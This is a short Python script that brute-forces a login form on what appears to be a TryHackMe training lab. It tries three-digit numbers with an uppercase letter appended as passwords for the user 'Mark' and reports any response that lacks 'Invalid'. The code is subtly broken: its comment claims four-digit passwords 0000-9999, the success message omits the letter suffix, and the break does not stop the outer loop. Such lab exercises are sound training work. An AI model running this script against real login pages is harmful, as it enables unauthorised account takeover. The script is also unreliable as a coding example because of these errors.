import requests
import string

url = "http://python.thm/labs/lab1/index.php"

username = "Mark"

# Generating 4-digit numeric passwords (0000-9999)
password_list = [str(i).zfill(3) for i in range(1000)]

def brute_force():
    for password in password_list:
        for char in string.ascii_uppercase:
            data = {"username": username, "password": password+char}
            response = requests.post(url, data=data)
            
            if "Invalid" not in response.text:
                print(f"[+] Found valid credentials: {username}:{password}")
                break
            else:
                print(f"[-] Attempted: {password+char}")

brute_force()
